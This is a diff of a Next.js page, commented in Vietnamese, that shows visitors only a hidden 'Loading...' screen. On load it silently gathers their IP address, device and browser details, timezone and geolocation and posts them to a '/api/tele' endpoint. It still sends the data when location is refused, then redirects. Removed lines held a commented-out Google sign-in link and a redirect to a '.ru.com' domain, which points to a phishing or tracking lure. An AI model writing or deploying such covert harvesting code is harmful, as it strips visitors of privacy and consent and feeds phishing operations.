@@ -1,31 +1,61 @@
 "use client";
-import { use, useEffect } from "react";
+
+import { useEffect } from "react";
 
 export default function Home() {
-
   useEffect(() => {
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
+    async function sendData() {
+      try {
+        // Lấy IP
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
 
-          await fetch("/api/location", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ latitude: lat, longitude: lon }),
-          });
+        // Chuẩn bị data cơ bản
+        const payload: any = {
+          ip: ipData.ip,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: `${window.screen.width}x${window.screen.height}`,
+          referrer: document.referrer || "none",
+          network: (navigator as any).connection?.effectiveType || "unknown",
+          platform: navigator.platform,
+        };
 
-          // window.location.href = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fdrive.google.com%2Fdrive%2Fquota&followup=https%3A%2F%2Fdrive.google.com%2Fdrive%2Fquota&ifkv=AdBytiNhY0wt9x7S7IG4lWgyMKJOZb6L5RmcKnN08SjnnUP9C1dEefnNRbGQRheIRp5wun3U35XHqg&osid=1&passive=1209600&service=wise&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1813591063%3A1755862011333835"
-          window.location.href = "https://achulen.ru.com/"
-        },
-        (err) => {
-          console.error("Không lấy được vị trí:", err);
-        }
-      );
-    } else {
-      console.log("Trình duyệt không hỗ trợ geolocation.");
+        // Xin quyền vị trí
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            payload.location = {
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+            };
+
+            // Gửi về API
+            await fetch("/api/tele", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload),
+            });
+
+            // Chỉ redirect khi có location
+            window.location.href = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://youtube.com";
+          },
+          async () => {
+            // Nếu từ chối location → vẫn gửi data nhưng không redirect
+            await fetch("/api/tele", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload),
+            });
+          }
+        );
+      } catch (err) {
+        console.error("Error sending data:", err);
+      }
     }
+
+    sendData();
   }, []);
 
+  return <div className="hidden">Loading...</div>;
 }
